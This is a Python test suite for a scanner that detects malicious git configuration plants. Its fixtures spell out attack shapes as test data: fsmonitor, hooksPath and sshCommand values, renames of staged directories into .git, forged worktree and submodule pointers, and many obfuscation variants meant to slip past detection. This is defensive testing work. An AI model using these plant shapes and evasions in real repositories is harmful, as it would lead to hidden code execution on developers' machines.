        import gen_rule_ids
        assert gen_rule_ids._SCANNER_ABBREV.get("scan_git_config.py") == "GC"


class TestConfigWriteArmTightening:
    """A1#1 root cause 2: the config-write arm must not fire on git's own
    fsmonitor test idioms - `-C` (chdir) is not `-c` (config), the daemon
    subcommand is not the config key, and inert values are protective."""

    def _chain(self, tmp_path, content, name="setup.sh"):
        (tmp_path / name).write_text(content)
        return scanner.scan_repo(str(tmp_path))

    def test_git_dash_C_daemon_subcommand_silent(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git -C test_implicit fsmonitor--daemon status\n"
            "mv test_implicit_1s/.gitxyz test_implicit_1s/.git\n")
        assert "GC-REN-001" not in _ids(findings)

    def test_fsmonitor_inert_values_silent(self, tmp_path):
        for line in ("git config core.fsmonitor false",
                     "git config core.fsmonitor true",
                     "git -c core.fsmonitor=false add .",
                     "git config core.hooksPath /dev/null"):
            findings = self._chain(tmp_path, line + "\nmv stage .git\n")
            assert "GC-REN-001" not in _ids(findings), line

    def test_t7527_style_combined_silent(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor true\n"
            "git -C $r fsmonitor--daemon stop 2>/dev/null\n"
            "mv test_implicit_1s/.gitxyz test_implicit_1s/.git &&\n")
        assert "GC-REN-001" not in _ids(findings)

    def test_git_dash_C_config_write_still_fires(self, tmp_path):
        # `git -C <path> config core.fsmonitor ./hook.sh` is a real plant
        # shape; only the daemon-subcommand confusion was removed.
        findings = self._chain(
            tmp_path,
            "git -C sub config core.fsmonitor ./hook.sh\nmv stage .git\n")
        assert "GC-REN-001" in _ids(findings)

    def test_dash_c_armed_value_still_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git -c core.fsmonitor=./hook.sh status\nmv stage .git\n")
        assert "GC-REN-001" in _ids(findings)


class TestRootGitSymlink:
    """A1 round-3 #1: a root .git SYMLINK satisfies neither the plain-dir nor
    the pointer-file branch - it must be realpath-resolved and inspected."""

    def test_root_dotgit_symlink_to_armed_dir_fires(self, tmp_path):
        external = tmp_path / "external_git"
        (external / "hooks").mkdir(parents=True)
        (external / "config").write_text(ARMED_CONFIG)
        (external / "hooks" / "pre-commit").write_text("#!/bin/sh\nid\n")
        checkout = tmp_path / "checkout"
        checkout.mkdir()
        os.symlink(str(external), str(checkout / ".git"))
        findings = scanner.scan_repo(str(checkout))
        ids = _ids(findings)
        assert "GC-SHIP-004" in ids
        assert "GC-SHIP-002" in ids
        assert "GC-SHIP-005" in ids

    def test_root_dotgit_symlink_redirect_flagged_even_when_benign(
            self, tmp_path):
        external = tmp_path / "external_git"
        external.mkdir()
        (external / "config").write_text(BENIGN_CONFIG)
        checkout = tmp_path / "checkout"
        checkout.mkdir()
        os.symlink(str(external), str(checkout / ".git"))
        findings = scanner.scan_repo(str(checkout))
        ids = _ids(findings)
        assert "GC-SHIP-004" in ids
        assert "GC-SHIP-002" not in ids


class TestWorktreeProofHardening:
    """A1 round-3 #2 / A2-N4: commondir contents must resolve to a genuine
    main-repo gitdir with .git/worktrees/<name> topology; an armed target
    config fires even behind valid topology; submodule roots stay silent."""

    def _worktree_fixture(self, tmp_path):
        main_git = tmp_path / "main" / ".git"
        wt_meta = main_git / "worktrees" / "wt"
        wt_meta.mkdir(parents=True)
        (main_git / "HEAD").write_text("ref: refs/heads/main\n")
        (wt_meta / "commondir").write_text("../..\n")
        wt = tmp_path / "wt"
        wt.mkdir()
        pointer = wt / ".git"
        pointer.write_text(f"gitdir: {wt_meta}\n")
        (wt_meta / "gitdir").write_text(f"{pointer}\n")
        return wt, wt_meta

    def test_valid_worktree_topology_silent(self, tmp_path):
        wt, _ = self._worktree_fixture(tmp_path)
        assert scanner.scan_repo(str(wt)) == []

    def test_forged_commondir_self_reference_flagged(self, tmp_path):
        # Manufactured external gitdir: commondir "." plus a gitdir
        # back-pointer. Round 2 accepted this; real git executes the armed
        # external config.
        ext = tmp_path / "ext_gitdir"
        ext.mkdir()
        (ext / "commondir").write_text(".\n")
        (ext / "config").write_text(ARMED_CONFIG)
        wt = tmp_path / "wt"
        wt.mkdir()
        pointer = wt / ".git"
        pointer.write_text(f"gitdir: {ext}\n")
        (ext / "gitdir").write_text(f"{pointer}\n")
        findings = scanner.scan_repo(str(wt))
        assert "GC-SHIP-004" in _ids(findings)

    def test_valid_topology_armed_target_config_fires(self, tmp_path):
        wt, wt_meta = self._worktree_fixture(tmp_path)
        (wt_meta / "config").write_text(ARMED_CONFIG)
        findings = scanner.scan_repo(str(wt))
        assert "GC-ROOT-001" in _ids(findings)

    def test_main_gitdir_without_head_flagged(self, tmp_path):
        wt, _ = self._worktree_fixture(tmp_path)
        (tmp_path / "main" / ".git" / "HEAD").unlink()
        findings = scanner.scan_repo(str(wt))
        assert "GC-SHIP-004" in _ids(findings)

    def _submodule_fixture(self, tmp_path):
        # Mirrors real git (verified 2.34.1): the parent .git is a genuine
        # gitdir, the modules/<name> target is a genuine metadata dir, and
        # NEITHER side carries a `gitdir` back-pointer file.
        parent_git = tmp_path / "parent" / ".git"
        sub_meta = parent_git / "modules" / "sub"
        sub_meta.mkdir(parents=True)
        for gitdir in (parent_git, sub_meta):
            (gitdir / "HEAD").write_text("ref: refs/heads/main\n")
            (gitdir / "objects").mkdir()
            (gitdir / "refs").mkdir()
        (sub_meta / "config").write_text(BENIGN_CONFIG)
        sub = tmp_path / "parent" / "sub"
        sub.mkdir()
        (sub / ".git").write_text(f"gitdir: {sub_meta}\n")
        return sub, sub_meta

    def test_submodule_checkout_as_root_silent(self, tmp_path):
        # A2-N4: a submodule checkout scanned as root is ordinary git state
        # (submodule gitdirs have no commondir).
        sub, _ = self._submodule_fixture(tmp_path)
        findings = scanner.scan_repo(str(sub))
        assert "GC-SHIP-004" not in _ids(findings)

    def test_submodule_root_armed_config_fires(self, tmp_path):
        sub, sub_meta = self._submodule_fixture(tmp_path)
        (sub_meta / "config").write_text(ARMED_CONFIG)
        findings = scanner.scan_repo(str(sub))
        assert "GC-ROOT-001" in _ids(findings)

    def test_submodule_target_armed_hook_fires(self, tmp_path):
        # Round 4 (A1 blocker): accepted external targets are inspected for
        # executable hooks, not only config.
        sub, sub_meta = self._submodule_fixture(tmp_path)
        hooks = sub_meta / "hooks"
        hooks.mkdir()
        hook = hooks / "pre-commit"
        hook.write_text("#!/bin/sh\n:\n")
        hook.chmod(0o755)
        findings = scanner.scan_repo(str(sub))
        assert "GC-SHIP-005" in _ids(findings)

    def test_worktree_target_armed_hook_fires(self, tmp_path):
        wt, wt_meta = self._worktree_fixture(tmp_path)
        hooks = wt_meta / "hooks"
        hooks.mkdir()
        hook = hooks / "pre-commit"
        hook.write_text("#!/bin/sh\n:\n")
        hook.chmod(0o755)
        findings = scanner.scan_repo(str(wt))
        assert "GC-SHIP-005" in _ids(findings)

    def test_submodule_target_without_head_flagged(self, tmp_path):
        sub, sub_meta = self._submodule_fixture(tmp_path)
        (sub_meta / "HEAD").unlink()
        findings = scanner.scan_repo(str(sub))
        assert "GC-SHIP-004" in _ids(findings)

    def test_submodule_parent_not_genuine_flagged(self, tmp_path):
        sub, _ = self._submodule_fixture(tmp_path)
        (tmp_path / "parent" / ".git" / "HEAD").unlink()
        findings = scanner.scan_repo(str(sub))
        assert "GC-SHIP-004" in _ids(findings)

    def test_forged_submodule_backpointer_flagged(self, tmp_path):
        # Round 4 (A1 blocker, demonstrated execution): a manufactured
        # directory at a path containing .git/modules/<name> with a planted
        # gitdir back-pointer must NOT authenticate itself - round 3
        # accepted this and git commit executed the shipped hook while the
        # scanner returned [].
        ext = tmp_path / "outside" / ".git" / "modules" / "x"
        ext.mkdir(parents=True)
        # Even a fully genuine-looking gitdir (git init) is not proof.
        subprocess.run(["git", "init", str(ext)], capture_output=True,
                       check=True)
        scanroot = tmp_path / "scanroot"
        scanroot.mkdir()
        pointer = scanroot / ".git"
        pointer.write_text(f"gitdir: {ext}\n")
        (ext / "gitdir").write_text(f"{pointer}\n")
        (ext / "hooks").mkdir(exist_ok=True)
        hook = ext / "hooks" / "pre-commit"
        hook.write_text("#!/bin/sh\n:\n")
        hook.chmod(0o755)
        findings = scanner.scan_repo(str(scanroot))
        assert "GC-SHIP-004" in _ids(findings)

    def test_forged_submodule_inside_tree_still_flagged(self, tmp_path):
        # The parent checkout must CONTAIN the scan root: a genuine-looking
        # parent gitdir next to (not around) the scan root is not proof.
        parent_git = tmp_path / "outside" / ".git"
        ext = parent_git / "modules" / "x"
        ext.mkdir(parents=True)
        for gitdir in (parent_git, ext):
            (gitdir / "HEAD").write_text("ref: refs/heads/main\n")
            (gitdir / "objects").mkdir()
            (gitdir / "refs").mkdir()
        scanroot = tmp_path / "scanroot"
        scanroot.mkdir()
        (scanroot / ".git").write_text(f"gitdir: {ext}\n")
        findings = scanner.scan_repo(str(scanroot))
        assert "GC-SHIP-004" in _ids(findings)


@pytest.mark.skipif(shutil.which("git") is None, reason="git not available")
class TestRealGitSubmodule:
    """Round 4 (A2-F2): fixtures built with REAL git commands, not
    hand-written files. Verified against git 2.34.1: a genuine
    .git/modules/<name> carries HEAD/config/objects/refs and NO gitdir
    back-pointer file."""

    def _real_submodule(self, tmp_path):
        env = dict(os.environ, GIT_CONFIG_GLOBAL=os.devnull,
                   GIT_CONFIG_SYSTEM=os.devnull)

        def g(*args, cwd=None):
            r = subprocess.run(
                ["git", "-c", "protocol.file.allow=always", *args],
                cwd=cwd, env=env, capture_output=True, text=True)
            assert r.returncode == 0, (args, r.stderr)

        subrepo = tmp_path / "subrepo"
        g("init", str(subrepo))
        g("-C", str(subrepo), "config", "user.email", "t@t")
        g("-C", str(subrepo), "config", "user.name", "t")
        (subrepo / "f").write_text("x")
        g("-C", str(subrepo), "add", ".")
        g("-C", str(subrepo), "commit", "-m", "x")
        parent = tmp_path / "parent"
        g("init", str(parent))
        g("-C", str(parent), "config", "user.email", "t@t")
        g("-C", str(parent), "config", "user.name", "t")
        (parent / "f").write_text("x")
        g("-C", str(parent), "add", ".")
        g("-C", str(parent), "commit", "-m", "x")
        # Nested path: git names the metadata dir after the submodule PATH,
        # slashes included (.git/modules/vendor/sub) - the layout A2-F2
        # verified against real git 2.34.1.
        g("-C", str(parent), "submodule", "add", str(subrepo), "vendor/sub")
        g("-C", str(parent), "commit", "-m", "sub")
        return parent, parent / "vendor" / "sub"

    def test_real_submodule_has_no_backpointer(self, tmp_path):
        parent, _ = self._real_submodule(tmp_path)
        meta = parent / ".git" / "modules" / "vendor" / "sub"
        assert (meta / "HEAD").is_file()
        assert not (meta / "gitdir").exists()

    def test_real_submodule_checkout_silent(self, tmp_path):
        _, sub = self._real_submodule(tmp_path)
        assert scanner.scan_repo(str(sub)) == []

    def test_real_submodule_armed_hook_fires(self, tmp_path):
        parent, sub = self._real_submodule(tmp_path)
        hook = (parent / ".git" / "modules" / "vendor" / "sub"
                / "hooks" / "pre-commit")
        hook.write_text("#!/bin/sh\n:\n")
        hook.chmod(0o755)
        findings = scanner.scan_repo(str(sub))
        assert "GC-SHIP-005" in _ids(findings)


class TestFlowAwareVariables:
    """A1 round-3 #3: last assignment before the use wins; assignments after
    the use do not arm it."""

    def _chain(self, tmp_path, content, name="setup.sh"):
        (tmp_path / name).write_text(content)
        return scanner.scan_repo(str(tmp_path))

    def test_reassignment_before_move_silent(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            "target=.git\ntarget=backup\nmv stage \"$target\"\n")
        assert "GC-REN-001" not in _ids(findings)

    def test_assignment_after_move_does_not_arm(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            "mv stage \"$target\"\ntarget=.git\n")
        assert "GC-REN-001" not in _ids(findings)

    def test_last_assignment_wins_still_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            "target=backup\ntarget=.git\nmv stage \"$target\"\n")
        assert "GC-REN-001" in _ids(findings)


class TestRenameIndirectionEvasions:
    """A1 round-3 #4: cheap indirection classes on the rename/copy arm."""

    def _chain(self, tmp_path, content, name="setup.sh"):
        (tmp_path / name).write_text(content)
        return scanner.scan_repo(str(tmp_path))

    def test_two_hop_variable_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            "a=.git\nb=$a\nmv stage $b\n")
        assert "GC-REN-001" in _ids(findings)

    def test_printf_command_substitution_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            "target=$(printf .git)\nmv stage \"$target\"\n")
        assert "GC-REN-001" in _ids(findings)

    def test_echo_command_substitution_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            "target=$(echo .git)\nmv stage \"$target\"\n")
        assert "GC-REN-001" in _ids(findings)

    def test_quote_concat_assignment_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            "target=\".\"git\nmv stage \"$target\"\n")
        assert "GC-REN-001" in _ids(findings)

    def test_quote_concat_operand_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\nmv stage \".\"git\n")
        assert "GC-REN-001" in _ids(findings)

    def test_escaped_literal_operand_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\nmv stage .g\\it\n")
        assert "GC-REN-001" in _ids(findings)

    def test_escaped_assignment_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            "target=.g\\it\nmv stage \"$target\"\n")
        assert "GC-REN-001" in _ids(findings)

    def test_env_indirection_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            "suffix=git\ntarget=.$suffix\nmv stage \"$target\"\n")
        assert "GC-REN-001" in _ids(findings)

    def test_python_concat_assignment_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "import os\nos.system('git config core.hooksPath .h')\n"
            "target = '.' + 'git'\nos.rename(stage, target)\n",
            name="plant.py")
        assert "GC-REN-001" in _ids(findings)

    def test_python_two_hop_variable_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "import os\nos.system('git config core.hooksPath .h')\n"
            "a = '.git'\nb = a\nos.rename(stage, b)\n",
            name="plant.py")
        assert "GC-REN-001" in _ids(findings)

    def test_node_template_literal_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "execSync('git config core.sshCommand ./s');\n"
            "const t = `.gi${'t'}`;\nfs.renameSync(a, t);\n",
            name="plant.js")
        assert "GC-REN-001" in _ids(findings)

    def test_inline_printf_operand_fires(self, tmp_path):
        # Round 4 (A2-F3 scope): the cheap indirection classes resolve in
        # INLINE operands too, not only in assignments.
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            'mv stage "$(printf .git)"\n')
        assert "GC-REN-001" in _ids(findings)

    def test_inline_echo_operand_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            'mv stage "$(echo .git)"\n')
        assert "GC-REN-001" in _ids(findings)

    def test_inline_operand_non_git_silent(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            'mv stage "$(printf backup)"\n')
        assert "GC-REN-001" not in _ids(findings)

    def test_python_inline_concat_operand_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "import os\nos.system('git config core.hooksPath .h')\n"
            "os.rename(stage, '.'+'git')\n",
            name="plant.py")
        assert "GC-REN-001" in _ids(findings)

    def test_python_inline_concat_non_git_silent(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "import os\nos.system('git config core.hooksPath .h')\n"
            "os.rename(stage, '.'+'backup')\n",
            name="plant.py")
        assert "GC-REN-001" not in _ids(findings)

    def test_node_inline_template_operand_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "execSync('git config core.sshCommand ./s');\n"
            "fs.renameSync(a, `.gi${'t'}`);\n",
            name="plant.js")
        assert "GC-REN-001" in _ids(findings)

    def test_node_same_line_assign_and_rename_fires(self, tmp_path):
        # Round 4 (A1 secondary): the same-line form slipped the per-line
        # gate while the multiline form fired.
        findings = self._chain(
            tmp_path,
            "execSync('git config core.sshCommand ./s');\n"
            "const target = `.gi${'t'}`; fs.renameSync(stage, target);\n",
            name="plant.js")
        assert "GC-REN-001" in _ids(findings)

    def test_node_same_line_non_git_silent(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "execSync('git config core.sshCommand ./s');\n"
            "const target = `.ba${'ckup'}`; fs.renameSync(stage, target);\n",
            name="plant.js")
        assert "GC-REN-001" not in _ids(findings)

    def test_unresolvable_substitution_silent(self, tmp_path):
        # Non-constant $(...) is a documented limit: unknown, never armed.
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            "target=$(cat name.txt)\nmv stage \"$target\"\n")
        assert "GC-REN-001" not in _ids(findings)


class TestCaseInsensitiveTargets:
    """A1 round-3 #5 / A2-N1: `.GIT` IS git's directory on Windows/macOS, so
    gates and comparisons are case-insensitive."""

    def _chain(self, tmp_path, content, name="setup.sh"):
        (tmp_path / name).write_text(content)
        return scanner.scan_repo(str(tmp_path))

    def test_uppercase_git_literal_fires(self, tmp_path):
        findings = self._chain(
            tmp_path, "git config core.fsmonitor x.sh\nmv staging .GIT\n")
        assert "GC-REN-001" in _ids(findings)

    def test_mixed_case_powershell_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor .t\\f.ps1\n"
            "Move-Item staging .GiT\n",
            name="plant.ps1")
        assert "GC-REN-001" in _ids(findings)

    def test_uppercase_variable_value_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\nD=.GIT\nmv stage \"$D\"\n")
        assert "GC-REN-001" in _ids(findings)


class TestFilterLfsBoundary:
    """A2-N2: only the stock git-lfs commands are inert; lookalike binaries
    (git-lfs-evil, git-lfsmuggle) are armed."""

    def test_git_lfs_evil_armed(self):
        config = "[filter \"lfs\"]\n\tclean = git-lfs-evil -- %f\n"
        entries = scanner.armed_config_entries(config)
        assert [e["key"] for e in entries] == ["filter.clean"]

    def test_git_lfsmuggle_armed(self):
        config = "[filter \"lfs\"]\n\tsmudge = git-lfsmuggle -- %f\n"
        entries = scanner.armed_config_entries(config)
        assert [e["key"] for e in entries] == ["filter.smudge"]

    def test_stock_git_lfs_still_inert(self):
        config = ("[filter \"lfs\"]\n\tclean = git-lfs clean -- %f\n"
                  "\tprocess = git-lfs filter-process\n")
        assert scanner.armed_config_entries(config) == []

    def test_bare_git_lfs_inert(self):
        config = "[filter \"lfs\"]\n\tclean = git-lfs\n"
        assert scanner.armed_config_entries(config) == []


class TestHookspathInertBoundary:
    """A2-N6: the arm-1 inert lookahead must align with the config parser -
    /dev/null is inert, /dev/null/evil is armed."""

    def _chain(self, tmp_path, content, name="setup.sh"):
        (tmp_path / name).write_text(content)
        return scanner.scan_repo(str(tmp_path))

    def test_hookspath_dev_null_subpath_arms_chain(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.hooksPath /dev/null/evil\nmv stage .git\n")
        assert "GC-REN-001" in _ids(findings)

    def test_hookspath_dev_null_still_inert(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.hooksPath /dev/null\nmv stage .git\n")
        assert "GC-REN-001" not in _ids(findings)


class TestSegmentAndCallSyntax:
    """A2-N5: quoted separators, nested call parens, fs.rename callback
    form, and target-naming/value-taking flags."""

    def _chain(self, tmp_path, content, name="setup.sh"):
        (tmp_path / name).write_text(content)
        return scanner.scan_repo(str(tmp_path))

    def test_quoted_separator_not_split(self, tmp_path):
        # The move exists only inside a quoted string; the shell never
        # parses it as a command.
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\n"
            "echo \"mv stage .git; done\"\n")
        assert "GC-REN-001" not in _ids(findings)

    def test_nested_parens_call_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "import os\nos.system('git config core.hooksPath .h')\n"
            "os.rename(str(stage), '.git')\n",
            name="plant.py")
        assert "GC-REN-001" in _ids(findings)

    def test_callback_form_fs_rename_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "execSync('git config core.hooksPath .h');\n"
            "fs.rename(a, '.git', (err) => { if (err) throw err; });\n",
            name="plant.js")
        assert "GC-REN-001" in _ids(findings)

    def test_mv_target_directory_flag_fires(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor x.sh\nmv -t .git stage\n")
        assert "GC-REN-001" in _ids(findings)

    def test_trailing_value_flag_still_finds_target(self, tmp_path):
        findings = self._chain(
            tmp_path,
            "git config core.fsmonitor .t\\f.ps1\n"
            "Move-Item staging .git -Filter *.tmp\n",
            name="plant.ps1")
        assert "GC-REN-001" in _ids(findings)
